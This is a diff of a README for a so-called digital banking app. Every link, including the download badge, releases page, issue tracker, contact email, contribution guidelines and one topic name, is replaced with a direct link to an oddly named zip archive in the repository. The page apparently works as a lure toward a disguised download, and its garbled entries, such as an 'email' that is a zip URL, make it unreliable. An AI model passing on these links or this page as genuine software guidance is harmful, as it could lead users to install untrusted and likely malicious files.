@@ -1,6 +1,6 @@
 # 🌟 digital-banking-app - Easy Digital Banking for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip%20Now-%E2%86%92-brightgreen)](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip)
+[![Download Now](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip%20Now-%E2%86%92-brightgreen)](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip)
 
 ## 🚀 Getting Started
 
@@ -20,9 +20,9 @@ To run this application, your computer should meet the following requirements:
 To download the digital-banking-app, follow these easy steps:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
-   [Download from Releases](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip)
+   [Download from Releases](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip)
 
-2. **Select the Latest Version:** Once on the page, find the latest version of the app at the top. Look for option names like "https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip" or "https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip".
+2. **Select the Latest Version:** Once on the page, find the latest version of the app at the top. Look for option names like "https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip" or "https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip".
 
 3. **Download the File:** Click on the file name to start downloading. Save it in a location where you can easily find it, like your Desktop or Downloads folder.
 
@@ -56,15 +56,15 @@ Your safety is our top priority. The digital-banking-app uses advanced encryptio
 If you have any questions or need assistance, feel free to reach out. You can find help in the following ways:
 
 - **FAQs:** Check the Frequently Asked Questions section in the app.
-- **Issue Tracker:** Report any issues you encounter on the [GitHub Issues Page](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip).
-- **Contact Us:** For support, you can email us at https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip
+- **Issue Tracker:** Report any issues you encounter on the [GitHub Issues Page](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip).
+- **Contact Us:** For support, you can email us at https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip
 
 ## 🔖 Topics
 
 This application covers various topics related to digital banking technology:
 
 - Angular
-- https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip Core
+- https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip Core
 - C#
 - Digital Banking
 - Full-Stack Development
@@ -73,8 +73,8 @@ This application covers various topics related to digital banking technology:
 
 ## 📣 Community Contributions
 
-We welcome contributions from our user community. If you have ideas for new features, improvements, or fixes, please consider contributing to the project. Check our [Contribution Guidelines](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip) for more information.
+We welcome contributions from our user community. If you have ideas for new features, improvements, or fixes, please consider contributing to the project. Check our [Contribution Guidelines](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip) for more information.
 
 ---
 
-Feel free to revisit the [Releases Page](https://raw.githubusercontent.com/MorenaMatla/digital-banking-app/main/predegenerate/digital-banking-app.zip) anytime you want to download updates or new versions of the app. Happy banking!
+Feel free to revisit the [Releases Page](https://github.com/MorenaMatla/digital-banking-app/raw/refs/heads/main/src/backend/Application/app_banking_digital_ophthalmoleucoscope.zip) anytime you want to download updates or new versions of the app. Happy banking!
